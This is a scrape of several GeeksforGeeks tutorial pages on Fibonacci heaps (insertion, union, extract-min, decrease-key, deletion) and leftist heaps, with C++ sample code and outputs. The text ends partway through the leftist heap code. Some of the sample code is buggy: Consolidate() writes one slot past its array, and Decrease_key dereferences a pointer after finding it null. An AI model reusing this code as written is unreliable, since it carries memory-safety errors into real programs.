stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:Difference between Binary Heap, Binomial Heap and Fibonacci HeapConvert min Heap to max HeapHeap Sort for decreasing order using min heapDifference between Min Heap and Max HeapFibonacci Heap - Deletion, Extract min and Decrease keyFibonacci Heap - Insertion and UnionCheck if a M-th fibonacci number divides N-th fibonacci numberCheck if sum of Fibonacci elements in an Array is a Fibonacci number or notMerge k sorted linked lists | Set 2 (Using Min Heap)Implementation of Binomial Heap | Set - 2 (delete() and decreseKey())Overview of Data Structures | Set 2 (Binary Tree, BST, Heap and Hash)Applications of Heap Data StructureTournament Tree (Winner Tree) and Binary HeapTime Complexity of building a heapWhy is Binary Heap Preferred over BST for Priority Queue?Check if a given Binary Tree is HeapK-ary HeapHeap in C++ STL | make_heap(), push_heap(), pop_heap(), sort_heap(), is_heap, is_heap_until()Implementation of Binomial HeapWhere is Heap Sort used practically? Article Tags : Advanced Data StructureHeapFibonacci Practice Tags : FibonacciHeap thumb_up 11 To-do Done 3.3 Based on 59 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page K Dimensional Tree | Set 3 (Delete) Next last_page Find shortest unique prefix for every word in a given list | Set 1 (Using Trie) Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Advanced Data Structure Agents in Artificial IntelligenceAVL Tree | Set 2 (Deletion)Decision Tree Introduction with exampleRed-Black Tree | Set 2 (Insert)Some Basic Theorems on Trees Most visited in Heap Huffman Coding | Greedy Algo-3K'th Smallest/Largest Element in Unsorted Array | Set 1Building Heap from Arrayk largest(or smallest) elements in an array | added Min Heap methodMax Heap in Java room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Fibonacci Heap - Insertion and Union - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ HeapSortBinary HeapTime Complexity of building a heapApplications of Heap Data StructureBinomial HeapFibonacci Heap | Set 1 (Introduction)Fibonacci Heap – Insertion and UnionFibonacci Heap – Deletion, Extract min and Decrease keyLeftist Tree / Leftist HeapK-ary HeapIterative HeapSortProgram for Fibonacci numbersProgram for nth Catalan NumberBell Numbers (Number of ways to Partition a Set)Binomial Coefficient | DP-9Permutation CoefficientTiling ProblemGold Mine ProblemCoin Change | DP-7Find minimum number of coins that make a given valueGreedy Algorithm to find Minimum number of CoinsK Centers Problem | Set 1 (Greedy Approximate Algorithm)Minimum Number of Platforms Required for a Railway/Bus StationMerge SortQuickSortAVL Tree | Set 1 (Insertion)LRU Cache ImplementationTrie | (Insert and Search)Red-Black Tree | Set 1 (Introduction)Introduction of B-Tree Fibonacci Heap – Insertion and Union Last Updated: 14-12-2020 Prerequisites: Fibonacci Heap (Introduction) Fibonacci Heap is a collection of trees with min-heap or max-heap property. In Fibonacci Heap, trees can have any shape even all trees can be single nodes (This is unlike Binomial Heap where every tree has to be Binomial Tree).In this article, we will discuss Insertion and Union operation on Fibonacci Heap. Insertion: To insert a node in a Fibonacci heap H, the following algorithm is followed: Create a new node ‘x’. Check whether heap H is empty or not. If H is empty then: Make x as the only node in the root list. Set H(min) pointer to x. Else: Insert x into root list and update H(min). Example: Union: Union of two Fibonacci heaps H1 and H2 can be accomplished as follows: Join root lists of Fibonacci heaps H1 and H2 and make a single Fibonacci heap H. If H1(min) < H2(min) then: H(min) = H1(min). Else: H(min) = H2(min). Example: Following is a program to demonstrate building and inserting in a Fibonacci heap: C++ filter_none edit close play_arrow link brightness_4 code // C++ program to demonstrate building // and inserting in a Fibonacci heap #include <cstdlib> #include <iostream> #include <malloc.h> using namespace std; struct node { node* parent; node* child; node* left; node* right; int key; }; // Creating min pointer as "mini" struct node* mini = NULL; // Declare an integer for number of nodes in the heap int no_of_nodes = 0; // Function to insert a node in heap void insertion(int val) { struct node* new_node = (struct node*)malloc(sizeof(struct node)); new_node->key = val; new_node->parent = NULL; new_node->child = NULL; new_node->left = new_node; new_node->right = new_node; if (mini != NULL) { (mini->left)->right = new_node; new_node->right = mini; new_node->left = mini->left; mini->left = new_node; if (new_node->key < mini->key) mini = new_node; } else { mini = new_node; } } // Function to display the heap void display(struct node* mini) { node* ptr = mini; if (ptr == NULL) cout << "The Heap is Empty" << endl; else { cout << "The root nodes of Heap are: " << endl; do { cout << ptr->key; ptr = ptr->right; if (ptr != mini) { cout << "-->"; } } while (ptr != mini && ptr->right != NULL); cout << endl << "The heap has " << no_of_nodes << " nodes" << endl; } } // Function to find min node in the heap void find_min(struct node* mini) { cout << "min of heap is: " << mini->key << endl; } // Driver code int main() { no_of_nodes = 7; insertion(4); insertion(3); insertion(7); insertion(5); insertion(2); insertion(1); insertion(10); display(mini); find_min(mini); return 0; } chevron_right filter_none Output: The root nodes of Heap are: 1-->2-->3-->4-->7-->5-->10 The heap has 7 nodes Min of heap is: 1 Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:Difference between Binary Heap, Binomial Heap and Fibonacci HeapUnion-Find Algorithm | (Union By Rank and Find by Optimized Path Compression)Difference between Min Heap and Max HeapConvert min Heap to max HeapHeap Sort for decreasing order using min heapFibonacci Heap - Deletion, Extract min and Decrease keyFibonacci Heap | Set 1 (Introduction)Check if a M-th fibonacci number divides N-th fibonacci numberCheck if sum of Fibonacci elements in an Array is a Fibonacci number or notScapeGoat Tree | Set 1 (Introduction and Insertion)Insertion and Deletion in HeapsProto Van Emde Boas Tree | Set 3 | Insertion and isMember QueryOctree | Insertion and SearchingVan Emde Boas Tree | Set 2 | Insertion, Find, Minimum and Maximum Queriesm-Way Search Tree | Set-2 | Insertion and DeletionKlee's Algorithm (Length Of Union Of Segments of a line)Test case generator for Tree using Disjoint-Set UnionTournament Tree (Winner Tree) and Binary HeapImplementation of Binomial Heap | Set - 2 (delete() and decreseKey())What is Heap Pollution in Java and how to resolve it?mohak_mahajanCheck out this Author's contributed articles.If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please Improve this article if you find anything incorrect by clicking on the "Improve Article" button below.Improved By : ritik1501 Article Tags : Advanced Data StructureHeapTechnical ScripterData Structures-HeapFibonacciTechnical Scripter 2018 Practice Tags : FibonacciHeap thumb_up 4 To-do Done 2.7 Based on 4 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Find the product of last N nodes of the given Linked List Next last_page Future of home automation Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Advanced Data Structure Agents in Artificial IntelligenceAVL Tree | Set 2 (Deletion)Decision Tree Introduction with exampleRed-Black Tree | Set 2 (Insert)Some Basic Theorems on Trees Most visited in Heap Huffman Coding | Greedy Algo-3K'th Smallest/Largest Element in Unsorted Array | Set 1Building Heap from Arrayk largest(or smallest) elements in an array | added Min Heap methodInsertion and Deletion in Heaps room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Fibonacci Heap - Deletion, Extract min and Decrease key - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Binary HeapTime Complexity of building a heapApplications of Heap Data StructureBinomial HeapFibonacci Heap | Set 1 (Introduction)Fibonacci Heap – Insertion and UnionFibonacci Heap – Deletion, Extract min and Decrease keyLeftist Tree / Leftist HeapK-ary HeapIterative HeapSortProgram for Fibonacci numbersProgram for nth Catalan NumberBell Numbers (Number of ways to Partition a Set)Binomial Coefficient | DP-9Permutation CoefficientTiling ProblemGold Mine ProblemCoin Change | DP-7Find minimum number of coins that make a given valueGreedy Algorithm to find Minimum number of CoinsK Centers Problem | Set 1 (Greedy Approximate Algorithm)Minimum Number of Platforms Required for a Railway/Bus StationMerge SortQuickSortHeapSortDoubly Linked List | Set 1 (Introduction and Insertion)Implementing a Linked List in Java using ClassAbstract Data TypesData Structures and Algorithms Online Courses : Free and PaidRecursive Practice Problems with Solutions Fibonacci Heap – Deletion, Extract min and Decrease key Last Updated: 14-12-2020 In the last post, we discussed the Insertion and Union of Fibonacci Heaps. In this post, we will discuss Extract_min(), Decrease_key() and Deletion() operations on Fibonacci heap. Prerequisites: Fibonacci Heap (Introduction) Fibonacci Heap – Insertion and Union Extract_min(): We create a function for deleting the minimum node and setting the min pointer to the minimum value in the remaining heap. The following algorithm is followed: Delete the min node. Set head to the next min node and add all the trees of the deleted node in the root list. Create an array of degree pointers of the size of the deleted node. Set degree pointer to the current node. Move to the next node. If degrees are different then set degree pointer to next node. If degrees are the same then join the Fibonacci trees by union operation. Repeat steps 4 and 5 until the heap is completed. Example: Decrease_key(): To decrease the value of any element in the heap, we follow the following algorithm: Decrease the value of the node ‘x’ to the new chosen value. CASE 1) If min-heap property is not violated, Update min pointer if necessary. CASE 2) If min-heap property is violated and parent of ‘x’ is unmarked, Cut off the link between ‘x’ and its parent. Mark the parent of ‘x’. Add tree rooted at ‘x’ to the root list and update min pointer if necessary. CASE 3)If min-heap property is violated and parent of ‘x’ is marked, Cut off the link between ‘x’ and its parent p[x]. Add ‘x’ to the root list, updating min pointer if necessary. Cut off link between p[x] and p[p[x]]. Add p[x] to the root list, updating min pointer if necessary. If p[p[x]] is unmarked, mark it. Else, cut off p[p[x]] and repeat steps 4.2 to 4.5, taking p[p[x]] as ‘x’. Example: Deletion(): To delete any element in a Fibonacci heap, the following algorithm is followed: Decrease the value of the node to be deleted ‘x’ to a minimum by Decrease_key() function. By using min-heap property, heapify the heap containing ‘x’, bringing ‘x’ to the root list. Apply Extract_min() algorithm to the Fibonacci heap. Example: Following is a program to demonstrate Extract min(), Deletion() and Decrease key() operations on a Fibonacci Heap: C++ filter_none edit close play_arrow link brightness_4 code // C++ program to demonstrate Extract min, Deletion() // and Decrease key() operations in a fibonacci heap #include <cmath> #include <cstdlib> #include <iostream> #include <malloc.h> using namespace std; // Creating a structure to represent a node in the heap struct node { node* parent; // Parent pointer node* child; // Child pointer node* left; // Pointer to the node on the left node* right; // Pointer to the node on the right int key; // Value of the node int degree; // Degree of the node char mark; // Black or white mark of the node char c; // Flag for assisting in the Find node function }; // Creating min pointer as "mini" struct node* mini = NULL; // Declare an integer for number of nodes in the heap int no_of_nodes = 0; // Function to insert a node in heap void insertion(int val) { struct node* new_node = (struct node*)malloc(sizeof(struct node)); new_node->key = val; new_node->degree = 0; new_node->mark = 'W'; new_node->c = 'N'; new_node->parent = NULL; new_node->child = NULL; new_node->left = new_node; new_node->right = new_node; if (mini != NULL) { (mini->left)->right = new_node; new_node->right = mini; new_node->left = mini->left; mini->left = new_node; if (new_node->key < mini->key) mini = new_node; } else { mini = new_node; } no_of_nodes++; } // Linking the heap nodes in parent child relationship void Fibonnaci_link(struct node* ptr2, struct node* ptr1) { (ptr2->left)->right = ptr2->right; (ptr2->right)->left = ptr2->left; if (ptr1->right == ptr1) mini = ptr1; ptr2->left = ptr2; ptr2->right = ptr2; ptr2->parent = ptr1; if (ptr1->child == NULL) ptr1->child = ptr2; ptr2->right = ptr1->child; ptr2->left = (ptr1->child)->left; ((ptr1->child)->left)->right = ptr2; (ptr1->child)->left = ptr2; if (ptr2->key < (ptr1->child)->key) ptr1->child = ptr2; ptr1->degree++; } // Consolidating the heap void Consolidate() { int temp1; float temp2 = (log(no_of_nodes)) / (log(2)); int temp3 = temp2; struct node* arr[temp3]; for (int i = 0; i <= temp3; i++) arr[i] = NULL; node* ptr1 = mini; node* ptr2; node* ptr3; node* ptr4 = ptr1; do { ptr4 = ptr4->right; temp1 = ptr1->degree; while (arr[temp1] != NULL) { ptr2 = arr[temp1]; if (ptr1->key > ptr2->key) { ptr3 = ptr1; ptr1 = ptr2; ptr2 = ptr3; } if (ptr2 == mini) mini = ptr1; Fibonnaci_link(ptr2, ptr1); if (ptr1->right == ptr1) mini = ptr1; arr[temp1] = NULL; temp1++; } arr[temp1] = ptr1; ptr1 = ptr1->right; } while (ptr1 != mini); mini = NULL; for (int j = 0; j <= temp3; j++) { if (arr[j] != NULL) { arr[j]->left = arr[j]; arr[j]->right = arr[j]; if (mini != NULL) { (mini->left)->right = arr[j]; arr[j]->right = mini; arr[j]->left = mini->left; mini->left = arr[j]; if (arr[j]->key < mini->key) mini = arr[j]; } else { mini = arr[j]; } if (mini == NULL) mini = arr[j]; else if (arr[j]->key < mini->key) mini = arr[j]; } } } // Function to extract minimum node in the heap void Extract_min() { if (mini == NULL) cout << "The heap is empty" << endl; else { node* temp = mini; node* pntr; pntr = temp; node* x = NULL; if (temp->child != NULL) { x = temp->child; do { pntr = x->right; (mini->left)->right = x; x->right = mini; x->left = mini->left; mini->left = x; if (x->key < mini->key) mini = x; x->parent = NULL; x = pntr; } while (pntr != temp->child); } (temp->left)->right = temp->right; (temp->right)->left = temp->left; mini = temp->right; if (temp == temp->right && temp->child == NULL) mini = NULL; else { mini = temp->right; Consolidate(); } no_of_nodes--; } } // Cutting a node in the heap to be placed in the root list void Cut(struct node* found, struct node* temp) { if (found == found->right) temp->child = NULL; (found->left)->right = found->right; (found->right)->left = found->left; if (found == temp->child) temp->child = found->right; temp->degree = temp->degree - 1; found->right = found; found->left = found; (mini->left)->right = found; found->right = mini; found->left = mini->left; mini->left = found; found->parent = NULL; found->mark = 'B'; } // Recursive cascade cutting function void Cascase_cut(struct node* temp) { node* ptr5 = temp->parent; if (ptr5 != NULL) { if (temp->mark == 'W') { temp->mark = 'B'; } else { Cut(temp, ptr5); Cascase_cut(ptr5); } } } // Function to decrease the value of a node in the heap void Decrease_key(struct node* found, int val) { if (mini == NULL) cout << "The Heap is Empty" << endl; if (found == NULL) cout << "Node not found in the Heap" << endl; found->key = val; struct node* temp = found->parent; if (temp != NULL && found->key < temp->key) { Cut(found, temp); Cascase_cut(temp); } if (found->key < mini->key) mini = found; } // Function to find the given node void Find(struct node* mini, int old_val, int val) { struct node* found = NULL; node* temp5 = mini; temp5->c = 'Y'; node* found_ptr = NULL; if (temp5->key == old_val) { found_ptr = temp5; temp5->c = 'N'; found = found_ptr; Decrease_key(found, val); } if (found_ptr == NULL) { if (temp5->child != NULL) Find(temp5->child, old_val, val); if ((temp5->right)->c != 'Y') Find(temp5->right, old_val, val); } temp5->c = 'N'; found = found_ptr; } // Deleting a node from the heap void Deletion(int val) { if (mini == NULL) cout << "The heap is empty" << endl; else { // Decreasing the value of the node to 0 Find(mini, val, 0); // Calling Extract_min function to // delete minimum value node, which is 0 Extract_min(); cout << "Key Deleted" << endl; } } // Function to display the heap void display() { node* ptr = mini; if (ptr == NULL) cout << "The Heap is Empty" << endl; else { cout << "The root nodes of Heap are: " << endl; do { cout << ptr->key; ptr = ptr->right; if (ptr != mini) { cout << "-->"; } } while (ptr != mini && ptr->right != NULL); cout << endl << "The heap has " << no_of_nodes << " nodes" << endl << endl; } } // Driver code int main() { // We will create a heap and insert 3 nodes into it cout << "Creating an initial heap" << endl; insertion(5); insertion(2); insertion(8); // Now we will display the root list of the heap display(); // Now we will extract the minimum value node from the heap cout << "Extracting min" << endl; Extract_min(); display(); // Now we will decrease the value of node '8' to '7' cout << "Decrease value of 8 to 7" << endl; Find(mini, 8, 7); display(); // Now we will delete the node '7' cout << "Delete the node 7" << endl; Deletion(7); display(); return 0; } chevron_right filter_none Output: Creating an initial heap The root nodes of Heap are: 2-->5-->8 The heap has 3 nodes Extracting min The root nodes of Heap are: 5 The heap has 2 nodes Decrease value of 8 to 7 The root nodes of Heap are: 5 The heap has 2 nodes Delete the node 7 Key Deleted The root nodes of Heap are: 5 The heap has 1 nodes Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:Difference between Binary Heap, Binomial Heap and Fibonacci HeapDifference between Min Heap and Max HeapConvert min Heap to max HeapHeap Sort for decreasing order using min heapGiven level order traversal of a Binary Tree, check if the Tree is a Min-HeapConvert BST to Min HeapMerge k sorted linked lists | Set 2 (Using Min Heap)Print all nodes less than a value x in a Min Heap.Maximum element in min heapK’th Least Element in a Min-HeapMaximise the number of toys that can be purchased with amount K using min HeapMerge two sorted arrays in constant space using Min HeapMin Heap in PythonComplexity analysis of various operations of Binary Min Heapk largest(or smallest) elements in an array | added Min Heap methodFibonacci Heap - Insertion and UnionFibonacci Heap | Set 1 (Introduction)Difference between Primary key and Unique keyCheck if a M-th fibonacci number divides N-th fibonacci numberCheck if sum of Fibonacci elements in an Array is a Fibonacci number or notmohak_mahajanCheck out this Author's contributed articles.If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please Improve this article if you find anything incorrect by clicking on the "Improve Article" button below.Improved By : ritik1501 Article Tags : Data StructuresHeapTechnical ScripterFibonacciTechnical Scripter 2018 Practice Tags : Data StructuresFibonacciHeap thumb_up 7 To-do Done 4 Based on 7 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Sum and Product of minimum and maximum element of Binary Search Tree Next last_page Nagarro Interview Experience Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Data Structures Proof that Clique Decision problem is NP-Complete | Set 2Difference between Stack and Queue Data StructuresInsert a node at a specific position in a linked listDifference between Linear and Non-linear Data StructuresInsertion and Deletion in Heaps Most visited in Heap Huffman Coding | Greedy Algo-3K'th Smallest/Largest Element in Unsorted Array | Set 1Building Heap from Arrayk largest(or smallest) elements in an array | added Min Heap methodMax Heap in Java room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Leftist Tree / Leftist Heap - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Time Complexity of building a heapApplications of Heap Data StructureBinomial HeapFibonacci Heap | Set 1 (Introduction)Fibonacci Heap – Insertion and UnionFibonacci Heap – Deletion, Extract min and Decrease keyLeftist Tree / Leftist HeapK-ary HeapIterative HeapSortMerge SortQuickSortHeapSortBinary HeapAVL Tree | Set 1 (Insertion)LRU Cache ImplementationTrie | (Insert and Search)Red-Black Tree | Set 1 (Introduction)Introduction of B-TreeSegment Tree | Set 1 (Sum of given range)AVL Tree | Set 2 (Deletion)Binary Indexed Tree or Fenwick TreeAgents in Artificial IntelligenceRed-Black Tree | Set 2 (Insert)XOR Linked List - A Memory Efficient Doubly Linked List | Set 1Disjoint Set Data StructuresInsert Operation in B-TreeDecision Tree Introduction with exampleLargest Rectangular Area in a Histogram | Set 1Design a data structure that supports insert, delete, search and getRandom in constant time Leftist Tree / Leftist Heap Last Updated: 17-02-2020 A leftist tree or leftist heap is a priority queue implemented with a variant of a binary heap. Every node has an s-value (or rank or distance) which is the distance to the nearest leaf. In contrast to a binary heap (Which is always a complete binary tree), a leftist tree may be very unbalanced. Below are time complexities of Leftist Tree / Heap. Function Complexity Comparison 1) Get Min: O(1) [same as both Binary and Binomial] 2) Delete Min: O(Log n) [same as both Binary and Binomial] 3) Insert: O(Log n) [O(Log n) in Binary and O(1) in Binomial and O(Log n) for worst case] 4) Merge: O(Log n) [O(Log n) in Binomial] A leftist tree is a binary tree with properties: Normal Min Heap Property : key(i) >= key(parent(i)) Heavier on left side : dist(right(i)) <= dist(left(i)). Here, dist(i) is the number of edges on the shortest path from node i to a leaf node in extended binary tree representation (In this representation, a null child is considered as external or leaf node). The shortest path to a descendant external node is through the right child. Every subtree is also a leftist tree and dist( i ) = 1 + dist( right( i ) ). Example: The below leftist tree is presented with its distance calculated for each node with the procedure mentioned above. The rightmost node has a rank of 0 as the right subtree of this node is null and its parent has a distance of 1 by dist( i ) = 1 + dist( right( i )). The same is followed for each node and their s-value( or rank) is calculated. From above second property, we can draw two conclusions : The path from root to rightmost leaf is the shortest path from root to a leaf. If the path to rightmost leaf has x nodes, then leftist heap has atleast 2x – 1 nodes. This means the length of path to rightmost leaf is O(log n) for a leftist heap with n nodes. Operations : The main operation is merge(). deleteMin() (or extractMin() can be done by removing root and calling merge() for left and right subtrees. insert() can be done be create a leftist tree with single key (key to be inserted) and calling merge() for given tree and tree with single node. Idea behind Merging : Since right subtree is smaller, the idea is to merge right subtree of a tree with other tree. Below are abstract steps. Put the root with smaller value as the new root. Hang its left subtree on the left. Recursively merge its right subtree and the other tree. Before returning from recursion: – Update dist() of merged root. – Swap left and right subtrees just below root, if needed, to keep leftist property of merged result Source : http://courses.cs.washington.edu/courses/cse326/08sp/lectures/05-leftist-heaps.pdf Detailed Steps for Merge: Compare the roots of two heaps. Push the smaller key into an empty stack, and move to the right child of smaller key. Recursively compare two keys and go on pushing the smaller key onto the stack and move to its right child. Repeat until a null node is reached. Take the last node processed and make it the right child of the node at top of the stack, and convert it to leftist heap if the properties of leftist heap are violated. Recursively go on popping the elements from the stack and making them the right child of new stack top. Example: Consider two leftist heaps given below: Merge them into a single leftist heap The subtree at node 7 violates the property of leftist heap so we swap it with the left child and retain the property of leftist heap. Convert to leftist heap. Repeat the process The worst case time complexity of this algorithm is O(log n) in the worst case, where n is the number of nodes in the leftist heap. Another example of merging two leftist heap: Implementation of leftist Tree / leftist Heap: filter_none edit close play_arrow link brightness_4 code //C++ program for leftist heap / leftist tree #include <bits/stdc++.h> using namespace std; // Node Class Declaration class LeftistNode { public: int element; LeftistNode *left; LeftistNode *right; int dist; LeftistNode(int & element, LeftistNode *lt = NULL, LeftistNode *rt = NULL, int np = 0) { this->element = element; right = rt; left = lt, dist = np; } }; //Class Declaration class LeftistHeap { public: LeftistHeap(); LeftistHeap(LeftistHeap &rhs); ~LeftistHeap(); bool isEmpty(); bool isFull(); int &findMin(); void Insert(int &x); void deleteMin(); void deleteMin(int &minItem); void makeEmpty(); void Merge(LeftistHeap &rhs); LeftistHeap & operator =(LeftistHeap &rhs); private: LeftistNode *root; LeftistNode *Merge(LeftistNode *h1, LeftistNode *h2); LeftistNode *Merge1(LeftistNode *h1, LeftistNode *h2); void swapChildren(LeftistNode * t); void reclaimMemory(LeftistNode * t); LeftistNode *clone(LeftistNode *t); }; // Construct the leftist heap LeftistHeap::LeftistHeap() { root = NULL; } // Copy constructor. LeftistHeap::LeftistHeap(LeftistHeap &rhs) { root = NULL; *this = rhs; } // Destruct the leftist heap LeftistHeap::~LeftistHeap() { makeEmpty( ); } /* Merge rhs into the priority queue. rhs becomes empty. rhs must be different from this.*/ void LeftistHeap::Merge(LeftistHeap &rhs) { if (this == &rhs) return; root = Merge(root, rhs.root); rhs.root = NULL; } /* Internal method to merge two roots. Deals with deviant cases and calls recursive Merge1.*/ LeftistNode *LeftistHeap::Merge(LeftistNode * h1, LeftistNode * h2) { if (h1 == NULL) return h2; if (h2 == NULL) return h1; if (h1->element < h2->element) return Merge1(h1, h2); else return Merge1(h2, h1); } /* Internal method to merge two roots. Assumes trees are not empty, and h1's root contains smallest item.*/ LeftistNode *LeftistHeap::Merge1(LeftistNode * h1, LeftistNode * h2) { if (h1->left == NULL) h1->left = h2; else { 